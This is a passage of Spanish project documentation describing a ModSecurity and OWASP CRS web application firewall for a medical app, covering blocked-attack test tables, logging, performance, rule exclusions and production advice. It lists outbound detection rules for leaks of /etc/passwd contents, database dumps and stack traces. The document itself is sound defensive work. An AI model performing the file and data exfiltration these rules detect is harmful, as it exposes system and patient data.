<tr class="row-odd"><td><p>Contenido de /etc/passwd</p></td>
<td><p>10011</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
<tr class="row-even"><td><p>Volcado de base de datos</p></td>
<td><p>10012</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
<tr class="row-odd"><td><p>Stack trace de Python</p></td>
<td><p>10013</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="fugas-de-informacion-en-cabeceras">
<h4>Fugas de información en cabeceras<a class="headerlink" href="#fugas-de-informacion-en-cabeceras" title="Link to this heading">¶</a></h4>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Verificación</p></th>
<th class="head"><p>Resultado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p>La respuesta 403 no revela nombre/versión del WAF</p></td>
<td><p>Sin fugas</p></td>
</tr>
<tr class="row-odd"><td><p>Header <code class="docutils literal notranslate"><span class="pre">Server:</span></code> muestra <code class="docutils literal notranslate"><span class="pre">nginx</span></code> sin número de versión</p></td>
<td><p>Sin fugas</p></td>
</tr>
</tbody>
</table>
</div>
</section>
</section>
</section>
<hr class="docutils" />
<section id="pruebas-de-integridad-funcionalidad-no-afectada">
<h2>8. Pruebas de integridad (funcionalidad no afectada)<a class="headerlink" href="#pruebas-de-integridad-funcionalidad-no-afectada" title="Link to this heading">¶</a></h2>
<p>Verificado que el WAF <strong>no bloquea</strong> el tráfico legítimo de la aplicación:</p>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Endpoint</p></th>
<th class="head"><p>Método</p></th>
<th class="head"><p>Resultado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/</span></code></p></td>
<td><p>GET</p></td>
<td><p>200 — Página principal cargada</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/api/config</span></code></p></td>
<td><p>GET</p></td>
<td><p>200 — JSON con <code class="docutils literal notranslate"><span class="pre">validation_limits</span></code></p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/api/auth/register</span></code></p></td>
<td><p>POST (JSON)</p></td>
<td><p>Funcional</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/api/auth/login</span></code></p></td>
<td><p>POST (JSON)</p></td>
<td><p>Funcional</p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/api/user</span></code></p></td>
<td><p>POST (JSON + CSRF)</p></td>
<td><p>Funcional</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/api/auth/me</span></code></p></td>
<td><p>GET (con sesión)</p></td>
<td><p>Funcional</p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/api/auth/logout</span></code></p></td>
<td><p>POST (con CSRF)</p></td>
<td><p>Funcional</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/static/css/style.css</span></code></p></td>
<td><p>GET</p></td>
<td><p>200 — Recursos estáticos servidos</p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/static/js/main.js</span></code></p></td>
<td><p>GET</p></td>
<td><p>200 — JavaScript servido</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/supervisor</span></code></p></td>
<td><p>GET</p></td>
<td><p>200 — Dashboard de desarrollo</p></td>
</tr>
</tbody>
</table>
</div>
<p><strong>213 tests backend</strong> ejecutados dentro del contenedor: todos pasan.</p>
</section>
<hr class="docutils" />
<section id="logging-y-monitorizacion">
<h2>9. Logging y monitorización<a class="headerlink" href="#logging-y-monitorizacion" title="Link to this heading">¶</a></h2>
<section id="ver-logs-en-tiempo-real">
<h3>Ver logs en tiempo real<a class="headerlink" href="#ver-logs-en-tiempo-real" title="Link to this heading">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>make<span class="w"> </span>logs-waf
</pre></div>
</div>
</section>
<section id="ficheros-de-log">
<h3>Ficheros de log<a class="headerlink" href="#ficheros-de-log" title="Link to this heading">¶</a></h3>
<p>Los logs de ModSecurity se persisten en el host en <code class="docutils literal notranslate"><span class="pre">data/waf/</span></code> (volumen montado en <code class="docutils literal notranslate"><span class="pre">/var/log/modsecurity</span></code> del contenedor).</p>
</section>
<section id="que-se-registra">
<h3>Qué se registra<a class="headerlink" href="#que-se-registra" title="Link to this heading">¶</a></h3>
<ul class="simple">
<li><p>Peticiones bloqueadas: regla activada, score, payload, IP origen.</p></li>
<li><p>Respuestas bloqueadas (outbound): regla activada, tipo de fuga detectada.</p></li>
<li><p>Peticiones que activaron reglas pero no alcanzaron el umbral de anomalía.</p></li>
<li><p>Errores internos del WAF.</p></li>
</ul>
</section>
<section id="formato-del-log">
<h3>Formato del log<a class="headerlink" href="#formato-del-log" title="Link to this heading">¶</a></h3>
<p>Cada entrada es un objeto JSON con la estructura:</p>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;client_ip&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;time_stamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;unique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;uri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;headers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="err">...</span><span class="p">}},</span>
<span class="w">    </span><span class="nt">&quot;response&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;http_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;headers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="err">...</span><span class="p">}},</span>
<span class="w">    </span><span class="nt">&quot;producer&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;modsecurity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ModSecurity v3.0.14 (Linux)&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;connector&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ModSecurity-nginx v1.0.4&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;secrules_engine&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Enabled&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;components&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;OWASP_CRS/4.23.0&quot;</span><span class="p">]</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;messages&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span>
<span class="w">      </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Descripción del ataque&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;942100&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Matched Data: ...&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;attack-sqli&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;OWASP_CRS&quot;</span><span class="p">]</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="impacto-en-el-rendimiento">
<h2>10. Impacto en el rendimiento<a class="headerlink" href="#impacto-en-el-rendimiento" title="Link to this heading">¶</a></h2>
<section id="inspeccion-de-peticiones-inbound">
<h3>Inspección de peticiones (inbound)<a class="headerlink" href="#inspeccion-de-peticiones-inbound" title="Link to this heading">¶</a></h3>
<p>La inspección de peticiones entrantes (cabeceras, query strings, body) añade una latencia mínima (&lt;5ms por petición en PL 1). El impacto es imperceptible para el usuario.</p>
</section>
<section id="inspeccion-de-respuestas-outbound">
<h3>Inspección de respuestas (outbound)<a class="headerlink" href="#inspeccion-de-respuestas-outbound" title="Link to this heading">¶</a></h3>
<p>La activación de <code class="docutils literal notranslate"><span class="pre">SecResponseBodyAccess</span> <span class="pre">On</span></code> tiene un impacto mayor que la inspección inbound:</p>
<ul class="simple">
<li><p><strong>Memoria</strong>: el WAF almacena el body de la respuesta en memoria antes de enviarlo al cliente (hasta <code class="docutils literal notranslate"><span class="pre">SecResponseBodyLimit</span> <span class="pre">=</span> <span class="pre">512</span> <span class="pre">KB</span></code>).</p></li>
<li><p><strong>CPU</strong>: las reglas de fase 4 (outbound) aplican expresiones regulares sobre el body completo.</p></li>
<li><p><strong>Latencia</strong>: se añade un overhead de ~10-30ms por respuesta inspeccionada, dependiendo del tamaño.</p></li>
<li><p><strong>MIME types limitados</strong>: solo se inspeccionan <code class="docutils literal notranslate"><span class="pre">text/plain</span></code>, <code class="docutils literal notranslate"><span class="pre">text/html</span></code>, <code class="docutils literal notranslate"><span class="pre">text/xml</span></code> y <code class="docutils literal notranslate"><span class="pre">application/json</span></code>. Los recursos estáticos (CSS, JS, imágenes) no se inspeccionan, reduciendo significativamente el impacto.</p></li>
</ul>
<p><strong>Mitigación aplicada</strong>: <code class="docutils literal notranslate"><span class="pre">SecResponseBodyLimit</span> <span class="pre">524288</span></code> (512 KB) evita que respuestas muy grandes (descargas de ficheros, exports) consuman recursos excesivos.</p>
<p><strong>Conclusión</strong>: el impacto es aceptable para una aplicación médica de este tamaño. En aplicaciones de alto tráfico, se podría limitar la inspección outbound solo a <code class="docutils literal notranslate"><span class="pre">application/json</span></code> o desactivarla selectivamente para rutas de alto volumen mediante exclusiones por URI.</p>
</section>
</section>
<hr class="docutils" />
<section id="ficheros-del-waf-en-el-proyecto">
<h2>11. Ficheros del WAF en el proyecto<a class="headerlink" href="#ficheros-del-waf-en-el-proyecto" title="Link to this heading">¶</a></h2>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Fichero / Directorio</p></th>
<th class="head"><p>Función</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> → servicio <code class="docutils literal notranslate"><span class="pre">waf</span></code></p></td>
<td><p>Definición del contenedor WAF, variables de entorno, volumes, healthcheck</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">waf/modsecurity-override.conf</span></code></p></td>
<td><p>Exclusiones de reglas y reglas personalizadas de exfiltración</p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">data/waf/</span></code></p></td>
<td><p>Logs persistentes de ModSecurity (montado como volumen, ignorado por <code class="docutils literal notranslate"><span class="pre">.gitignore</span></code>)</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<hr class="docutils" />
<section id="personalizacion">
<h2>12. Personalización<a class="headerlink" href="#personalizacion" title="Link to this heading">¶</a></h2>
<section id="cambiar-a-modo-deteccion-sin-bloqueo">
<h3>Cambiar a modo detección (sin bloqueo)<a class="headerlink" href="#cambiar-a-modo-deteccion-sin-bloqueo" title="Link to this heading">¶</a></h3>
<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="c1"># docker-compose.yml → servicio waf → environment</span>
<span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MODSEC_RULE_ENGINE=DetectionOnly</span>
</pre></div>
</div>
</section>
<section id="subir-el-paranoia-level">
<h3>Subir el Paranoia Level<a class="headerlink" href="#subir-el-paranoia-level" title="Link to this heading">¶</a></h3>
<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">PARANOIA=2</span><span class="w">  </span><span class="c1"># o 3 o 4</span>
</pre></div>
</div>
<blockquote>
<div><p>Al subir el PL, es probable que aparezcan nuevos falsos positivos. Revisar los logs (<code class="docutils literal notranslate"><span class="pre">make</span> <span class="pre">logs-waf</span></code>), identificar las reglas activadas y añadir exclusiones en <code class="docutils literal notranslate"><span class="pre">waf/modsecurity-override.conf</span></code>.</p>
</div></blockquote>
</section>
<section id="anadir-una-nueva-exclusion">
<h3>Añadir una nueva exclusión<a class="headerlink" href="#anadir-una-nueva-exclusion" title="Link to this heading">¶</a></h3>
<p>Formato general (exclusión AFTER-CRS que elimina una regla específica para un campo concreto en una ruta):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SecRule</span> <span class="n">REQUEST_URI</span> <span class="s2">&quot;@beginsWith /api/mi-ruta&quot;</span> \
    <span class="s2">&quot;id:10006,</span><span class="se">\</span>
<span class="s2">    phase:1,</span><span class="se">\</span>
<span class="s2">    pass,</span><span class="se">\</span>
<span class="s2">    nolog,</span><span class="se">\</span>
<span class="s2">    ctl:ruleRemoveTargetById=REGLA_ID;ARGS:nombre_campo&quot;</span>
</pre></div>
</div>
<ul class="simple">
<li><p>El <code class="docutils literal notranslate"><span class="pre">id</span></code> debe ser único (rango 10000+).</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">phase:1</span></code> = se aplica en la fase de cabeceras/petición.</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">ctl:ruleRemoveTargetById</span></code> desactiva una regla específica solo para ese campo.</p></li>
</ul>
</section>
</section>
<hr class="docutils" />
<section id="consideraciones-de-produccion">
<h2>13. Consideraciones de producción<a class="headerlink" href="#consideraciones-de-produccion" title="Link to this heading">¶</a></h2>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Aspecto</p></th>
<th class="head"><p>Recomendación</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><strong>Supervisor</strong></p></td>
<td><p>Desactivar (<code class="docutils literal notranslate"><span class="pre">APP_SUPERVISOR=0</span></code>). Las exclusiones 10004/10005 dejan de aplicarse.</p></td>
</tr>
<tr class="row-odd"><td><p><strong>HTTPS</strong></p></td>
<td><p>Colocar un terminador TLS delante del WAF o configurar certificados en el contenedor.</p></td>
</tr>
<tr class="row-even"><td><p><strong>Logs</strong></p></td>
<td><p>Rotar los logs de <code class="docutils literal notranslate"><span class="pre">data/waf/</span></code> con logrotate para evitar crecimiento indefinido.</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Paranoia Level</strong></p></td>
<td><p>Evaluar PL 2 tras un período de observación con <code class="docutils literal notranslate"><span class="pre">DetectionOnly</span></code>.</p></td>
</tr>
<tr class="row-even"><td><p><strong>Actualizaciones</strong></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">pull</span> <span class="pre">owasp/modsecurity-crs:nginx-alpine</span></code> y reiniciar para obtener nuevas reglas.</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Outbound filtering</strong></p></td>
<td><p>Mantener activo para detectar fugas. Ajustar <code class="docutils literal notranslate"><span class="pre">SecResponseBodyLimit</span></code> según necesidad.</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<hr class="docutils" />
<section id="postura-de-seguridad-final">
<h2>14. Postura de seguridad final<a class="headerlink" href="#postura-de-seguridad-final" title="Link to this heading">¶</a></h2>
<p>Con la implementación completa del WAF, la aplicación cuenta con las siguientes capas de protección:</p>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Capa</p></th>
<th class="head"><p>Medida</p></th>
<th class="head"><p>Cobertura</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><strong>Perímetro (inbound)</strong></p></td>
<td><p>ModSecurity + OWASP CRS</p></td>
<td><p>SQLi, XSS, RCE, LFI, SSRF, scanners, Log4Shell</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Perímetro (outbound)</strong></p></td>
<td><p>Outbound filtering + reglas custom</p></td>
<td><p>Tarjetas de crédito, /etc/passwd, dumps SQL, stack traces</p></td>
</tr>
<tr class="row-even"><td><p><strong>Entrada</strong></p></td>
<td><p>Validación y sanitización</p></td>
<td><p>Nombres, fechas, pesos, alturas</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Autenticación</strong></p></td>
<td><p>Argon2id, HIBP, reCAPTCHA v3</p></td>
<td><p>Contraseñas fuertes, brecha conocida, bots</p></td>
</tr>
<tr class="row-even"><td><p><strong>Sesión</strong></p></td>
<td><p>Cookies HttpOnly, SameSite, CSRF</p></td>
<td><p>Protección de sesión</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Transporte</strong></p></td>
<td><p>Headers de seguridad, HSTS</p></td>
<td><p>Clickjacking, MIME sniffing, XSS</p></td>
</tr>
<tr class="row-even"><td><p><strong>Aplicación</strong></p></td>
<td><p>Rate limiting (Flask-Limiter)</p></td>
<td><p>Fuerza bruta en login/register</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Almacenamiento</strong></p></td>
<td><p>SQLCipher (opcional)</p></td>
<td><p>Cifrado de BD en reposo</p></td>
</tr>
</tbody>
</table>
</div>
<p>El WAF complementa (no sustituye) las demás capas. La defensa en profundidad asegura que incluso si una capa falla, las demás siguen protegiendo la aplicación.</p>
</section>
<hr class="docutils" />
<section id="relacion-con-otras-medidas-de-seguridad">
<h2>15. Relación con otras medidas de seguridad<a class="headerlink" href="#relacion-con-otras-medidas-de-seguridad" title="Link to this heading">¶</a></h2>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Capa</p></th>
<th class="head"><p>Medida</p></th>
<th class="head"><p>Documentación</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p>Entrada</p></td>
<td><p>Validación y sanitización de datos</p></td>
<td><p><a class="reference internal" href="01-validacion-entradas.html"><span class="std std-doc">01. Validación de entradas</span></a></p></td>
</tr>
<tr class="row-odd"><td><p>Autenticación</p></td>
<td><p>Argon2id, HIBP, reCAPTCHA v3</p></td>
<td><p><a class="reference internal" href="02-autenticacion-contrasenas.html"><span class="std std-doc">02. Autenticación y contraseñas</span></a></p></td>
</tr>
<tr class="row-even"><td><p>Sesión</p></td>
<td><p>Cookies HttpOnly, SameSite, CSRF tokens</p></td>
<td><p><a class="reference internal" href="03-sesiones-csrf.html"><span class="std std-doc">03. Sesiones y CSRF</span></a></p></td>
</tr>
<tr class="row-odd"><td><p>Transporte</p></td>
<td><p>Headers de seguridad, HSTS, SQLCipher</p></td>
<td><p><a class="reference internal" href="04-headers-https.html"><span class="std std-doc">04. Headers y HTTPS</span></a></p></td>
</tr>
<tr class="row-even"><td><p>Aplicación</p></td>
<td><p>Rate limiting (Flask-Limiter)</p></td>
<td><p><a class="reference internal" href="05-rate-limiting-y-config.html"><span class="std std-doc">05. Rate limiting y configuración</span></a></p></td>
</tr>
<tr class="row-odd"><td><p><strong>Perímetro</strong></p></td>
<td><p><strong>WAF: ModSecurity + OWASP CRS</strong></p></td>
<td><p><strong>Este documento</strong></p></td>
</tr>
</tbody>
</table>
</div>
<p><a class="reference internal" href="../SEGURIDAD.html"><span class="std std-doc">← Índice de seguridad</span></a></p>
</section>
</section>

        </article>
      </div>
      <footer>
        
        <div class="related-pages">
          
          
        </div>
        <div class="bottom-of-page">
          <div class="left-details">
            <div class="copyright">
                Copyright &#169; 2025, PumukyDev &amp; Alejandro Quiñones
            </div>
            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
            
            <a href="https://github.com/pradyunsg/furo">Furo</a>
            
          </div>
          <div class="right-details">
            
          </div>
        </div>
        
      </footer>
    </div>
    <aside class="toc-drawer">
      
      
      <div class="toc-sticky toc-scroll">
        <div class="toc-title-container">
          <span class="toc-title">
            On this page
          </span>
        </div>
        <div class="toc-tree-container">
          <div class="toc-tree">
            <ul>
<li><a class="reference internal" href="#">WAF: ModSecurity v3 + OWASP Core Rule Set (CRS)</a><ul>
<li><a class="reference internal" href="#que-es-y-por-que-se-usa">1. Qué es y por qué se usa</a><ul>
<li><a class="reference internal" href="#que-aporta-a-la-aplicacion">Qué aporta a la aplicación</a></li>
</ul>
</li>
<li><a class="reference internal" href="#arquitectura">2. Arquitectura</a></li>
<li><a class="reference internal" href="#proceso-de-despliegue-detectiononly-on">3. Proceso de despliegue: DetectionOnly → On</a><ul>
<li><a class="reference internal" href="#fase-1-modo-detectiononly-observacion">Fase 1: Modo DetectionOnly (observación)</a></li>
<li><a class="reference internal" href="#fase-2-modo-on-bloqueo">Fase 2: Modo On (bloqueo)</a></li>
</ul>
</li>
<li><a class="reference internal" href="#configuracion">4. Configuración</a><ul>
<li><a class="reference internal" href="#paranoia-level-pl">Paranoia Level (PL)</a></li>
<li><a class="reference internal" href="#anomaly-scoring">Anomaly Scoring</a></li>
</ul>
</li>
<li><a class="reference internal" href="#analisis-de-falsos-positivos-y-exclusiones">5. Análisis de falsos positivos y exclusiones</a><ul>
<li><a class="reference internal" href="#falso-positivo-1-campo-password-en-login-register">5.1. Falso positivo 1: Campo <code class="docutils literal notranslate"><span class="pre">password</span></code> en login/register</a></li>
<li><a class="reference internal" href="#falso-positivo-2-campo-recaptcha-token">5.2. Falso positivo 2: Campo <code class="docutils literal notranslate"><span class="pre">recaptcha_token</span></code></a></li>
<li><a class="reference internal" href="#falso-positivo-3-campos-first-name-last-name">5.3. Falso positivo 3: Campos <code class="docutils literal notranslate"><span class="pre">first_name</span></code> / <code class="docutils literal notranslate"><span class="pre">last_name</span></code></a></li>
<li><a class="reference internal" href="#falso-positivo-4-dashboard-supervisor">5.4. Falso positivo 4: Dashboard Supervisor</a></li>
</ul>
</li>
<li><a class="reference internal" href="#proteccion-contra-exfiltracion-de-datos-outbound-filtering">6. Protección contra exfiltración de datos (Outbound Filtering)</a><ul>
<li><a class="reference internal" href="#id1">Configuración</a></li>
<li><a class="reference internal" href="#reglas-crs-de-respuesta-automaticas">Reglas CRS de respuesta (automáticas)</a></li>
<li><a class="reference internal" href="#reglas-personalizadas-de-exfiltracion">Reglas personalizadas de exfiltración</a></li>
<li><a class="reference internal" href="#pruebas-de-exfiltracion-realizadas">Pruebas de exfiltración realizadas</a></li>
<li><a class="reference internal" href="#nota-sobre-el-comportamiento-en-reverse-proxy">Nota sobre el comportamiento en reverse proxy</a></li>
</ul>
</li>
<li><a class="reference internal" href="#ataques-bloqueados-bateria-de-pruebas-verificada">7. Ataques bloqueados (batería de pruebas verificada)</a><ul>
<li><a class="reference internal" href="#extracto-real-del-log-sql-injection-detectada-modo-detectiononly">Extracto real del log — SQL Injection detectada (modo DetectionOnly)</a></li>
<li><a class="reference internal" href="#extracto-real-del-log-xss-detectada-modo-detectiononly">Extracto real del log — XSS detectada (modo DetectionOnly)</a></li>
<li><a class="reference internal" href="#extracto-real-del-log-command-injection-lfi-modo-detectiononly">Extracto real del log — Command Injection / LFI (modo DetectionOnly)</a></li>
<li><a class="reference internal" href="#extracto-real-del-log-scanner-detectado-modo-detectiononly">Extracto real del log — Scanner detectado (modo DetectionOnly)</a></li>
<li><a class="reference internal" href="#tabla-resumen-modo-on-bloqueo-activo">Tabla resumen — Modo On (bloqueo activo)</a><ul>
<li><a class="reference internal" href="#inyeccion-sql">Inyección SQL</a></li>
<li><a class="reference internal" href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a></li>
<li><a class="reference internal" href="#inyeccion-de-comandos-lfi">Inyección de comandos / LFI</a></li>
<li><a class="reference internal" href="#ataques-de-protocolo-aplicacion">Ataques de protocolo / aplicación</a></li>
<li><a class="reference internal" href="#deteccion-de-scanners">Detección de scanners</a></li>
<li><a class="reference internal" href="#exfiltracion-de-datos-outbound">Exfiltración de datos (outbound)</a></li>
<li><a class="reference internal" href="#fugas-de-informacion-en-cabeceras">Fugas de información en cabeceras</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#pruebas-de-integridad-funcionalidad-no-afectada">8. Pruebas de integridad (funcionalidad no afectada)</a></li>
<li><a class="reference internal" href="#logging-y-monitorizacion">9. Logging y monitorización</a><ul>
<li><a class="reference internal" href="#ver-logs-en-tiempo-real">Ver logs en tiempo real</a></li>
<li><a class="reference internal" href="#ficheros-de-log">Ficheros de log</a></li>
<li><a class="reference internal" href="#que-se-registra">Qué se registra</a></li>
<li><a class="reference internal" href="#formato-del-log">Formato del log</a></li>
</ul>
</li>
<li><a class="reference internal" href="#impacto-en-el-rendimiento">10. Impacto en el rendimiento</a><ul>
<li><a class="reference internal" href="#inspeccion-de-peticiones-inbound">Inspección de peticiones (inbound)</a></li>
<li><a class="reference internal" href="#inspeccion-de-respuestas-outbound">Inspección de respuestas (outbound)</a></li>
</ul>
</li>
<li><a class="reference internal" href="#ficheros-del-waf-en-el-proyecto">11. Ficheros del WAF en el proyecto</a></li>
<li><a class="reference internal" href="#personalizacion">12. Personalización</a><ul>
<li><a class="reference internal" href="#cambiar-a-modo-deteccion-sin-bloqueo">Cambiar a modo detección (sin bloqueo)</a></li>
<li><a class="reference internal" href="#subir-el-paranoia-level">Subir el Paranoia Level</a></li>
<li><a class="reference internal" href="#anadir-una-nueva-exclusion">Añadir una nueva exclusión</a></li>
</ul>
</li>
<li><a class="reference internal" href="#consideraciones-de-produccion">13. Consideraciones de producción</a></li>
<li><a class="reference internal" href="#postura-de-seguridad-final">14. Postura de seguridad final</a></li>
<li><a class="reference internal" href="#relacion-con-otras-medidas-de-seguridad">15. Relación con otras medidas de seguridad</a></li>
</ul>
</li>
</ul>

          </div>
        </div>
      </div>
      
      
    </aside>
  </div>
</div><script src="../_static/documentation_options.js?v=01f34227"></script>
    <script src="../_static/doctools.js?v=9bcbadda"></script>
    <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="../_static/scripts/furo.js?v=46bd48cc"></script>
    </body>
</html>